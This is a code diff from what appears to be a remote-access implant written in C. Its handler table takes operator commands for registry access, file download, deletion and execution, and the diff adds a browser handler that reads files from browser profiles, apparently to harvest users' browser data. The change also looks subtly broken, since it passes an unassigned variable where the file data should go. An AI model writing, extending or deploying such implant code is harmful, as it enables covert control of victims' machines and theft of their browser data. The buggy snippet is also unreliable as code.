@@ -3349,6 +3349,8 @@ PENVELOPE BrowserHandler
 	PPBElement* pProfileList = NULL;
 	DWORD dwNumberOfItems = 0;
 	DWORD dwNumberOfProfiles = 0;
+	PBYTE pItemFileData = NULL;
+	DWORD cbItemFileData = 0;
 	/*
 	{
 		type int64
@@ -3388,12 +3390,15 @@ PENVELOPE BrowserHandler
 			dwNumberOfItems = 0;
 			for (k = 0; k < ProfileItemEnd; k++) {
 				if (pProfile->ItemPaths[i] != NULL) {
-					ItemType[0] = CreateVarIntElement(k, 1);
-					lpTemp = ConvertWcharToChar(pProfile->ItemPaths[i]);
-					ItemType[1] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 2);
-					FREE(lpTemp);
+					cbItemFileData = 0;
+					pItemFileData = ReadFromFile(pProfile->ItemPaths[i], &cbItemFileData);
+					if (pItemFileData != NULL) {
+						ItemType[0] = CreateVarIntElement(k, 1);
+						ItemType[1] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 2);
 
-					pItemList[dwNumberOfItems++] = CreateStructElement(ItemType, _countof(ItemType), 0);
+						pItemList[dwNumberOfItems++] = CreateStructElement(ItemType, _countof(ItemType), 0);
+						FREE(pItemFileData);
+					}
 				}
 			}
 
@@ -3439,9 +3444,9 @@ SYSTEM_HANDLER* GetSystemHandler()
 	HandlerList[MsgRegistryDeleteKeyReq] = RegistryDeleteKeyHandler;
 	HandlerList[MsgRegistrySubKeysListReq] = RegistrySubKeysListHandler;
 	HandlerList[MsgRegistryListValuesReq] = RegistryListValuesHandler;
-	HandlerList[MsgServicesReq] = ServicesHandler;
+	/*HandlerList[MsgServicesReq] = ServicesHandler;
 	HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
-	HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;
+	HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
 	HandlerList[MsgPing] = PingHandler;
 	HandlerList[MsgLsReq] = LsHandler;
 	HandlerList[MsgDownloadReq] = DownloadHandler;
@@ -3450,9 +3455,10 @@ SYSTEM_HANDLER* GetSystemHandler()
 	HandlerList[MsgPwdReq] = PwdHandler;
 	HandlerList[MsgRmReq] = RmHandler;
 	HandlerList[MsgMvReq] = MvHandler;
-	HandlerList[MsgCpReq] = CpHandler;
+	//HandlerList[MsgCpReq] = CpHandler;
 	HandlerList[MsgMkdirReq] = MkdirHandler;
 	HandlerList[MsgExecuteReq] = ExecuteHandler;
+	HandlerList[MsgBrowserReq] = BrowserHandler;
 	
 	HandlerList[MsgTaskReq] = NULL;
 	HandlerList[MsgProcessDumpReq] = NULL;
